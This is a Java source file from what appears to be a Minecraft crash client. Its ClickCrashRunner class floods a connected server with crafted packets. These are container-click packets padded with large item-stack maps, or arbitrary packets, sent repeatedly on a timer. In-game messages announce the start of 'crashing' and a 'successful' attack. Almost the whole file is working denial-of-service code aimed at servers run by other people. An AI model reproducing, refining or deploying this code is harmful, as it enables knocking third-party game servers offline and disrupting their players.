package me.dannycrasher.client.module.impl.crash;

import com.viaversion.viafabricplus.ViaFabricPlus;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.function.Supplier;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.protocol.Protocol;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.packets.Packet;
import me.dannycrasher.client.protocol.packets.PacketCodec;
import me.dannycrasher.client.protocol.packets.play.PacketContainerClick;
import net.minecraft.client.Minecraft;

final class ClickCrashRunner {
	private ClickCrashRunner() {
	}

	static ScheduledExecutorService startItemClick(
			Module module,
			ModuleContext context,
			ScheduledExecutorService previous,
			ItemStack stack,
			int mapSize,
			int packets,
			int threadSleep,
			int loopAmount
	) {
		if (previous != null && !previous.isShutdown()) {
			previous.shutdownNow();
			context.sendMessage("Previous attack <red>stopped<white>!");
		}

		module.setEnabled(true);
		Int2ObjectMap<ItemStack> map = new Int2ObjectOpenHashMap<>();
		for (int j = 0; j < mapSize; ++j) {
			map.put(j, stack);
		}

		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		context.sendMessage("Start crashing with method: <aqua>" + module.getName() + "<white>!");

		AtomicInteger check = new AtomicInteger(0);
		ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
		executor.scheduleAtFixedRate(() -> {
			if (!module.isEnabled() || !Protocol.isSendingEnabled() || check.get() == loopAmount
					|| (Minecraft.getInstance().getConnection() == null || !Minecraft.getInstance().getConnection().getConnection().isConnected())) {
				executor.shutdown();
				module.setEnabled(false);
				if (Minecraft.getInstance().getConnection() != null) {
					context.sendMessage("Attack <green>successful <white>finished!");
				}
			} else {
				PacketCodec.sendPacket(new PacketContainerClick(
						protocol,
						0,
						1,
						10,
						PacketContainerClick.ContainerActionType.CLICK_ITEM,
						PacketContainerClick.ContainerAction.RIGHT_CLICK,
						stack,
						map
				), packets);
			}
			check.getAndIncrement();
		}, 0, threadSleep, TimeUnit.MILLISECONDS);
		return executor;
	}

	static ScheduledExecutorService startPackets(
			Module module,
			ModuleContext context,
			ScheduledExecutorService previous,
			Supplier<Packet> packetFactory,
			int packets,
			int threadSleep,
			int loopAmount
	) {
		if (previous != null && !previous.isShutdown()) {
			previous.shutdownNow();
			context.sendMessage("Previous attack <red>stopped<white>!");
		}

		module.setEnabled(true);
		context.sendMessage("Start crashing with method: <aqua>" + module.getName() + "<white>!");

		AtomicInteger check = new AtomicInteger(0);
		ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
		executor.scheduleAtFixedRate(() -> {
			if (!module.isEnabled() || !Protocol.isSendingEnabled() || check.get() == loopAmount
					|| (Minecraft.getInstance().getConnection() == null || !Minecraft.getInstance().getConnection().getConnection().isConnected())) {
				executor.shutdown();
				module.setEnabled(false);
				if (Minecraft.getInstance().getConnection() != null) {
					context.sendMessage("Attack <green>successful <white>finished!");
				}
			} else {
				PacketCodec.sendPacket(packetFactory.get(), packets);
			}
			check.getAndIncrement();
		}, 0, threadSleep, TimeUnit.MILLISECONDS);
		return executor;
	}

	static void shutdown(ScheduledExecutorService executor) {
		if (executor != null) {
			executor.shutdownNow();
		}
	}
}
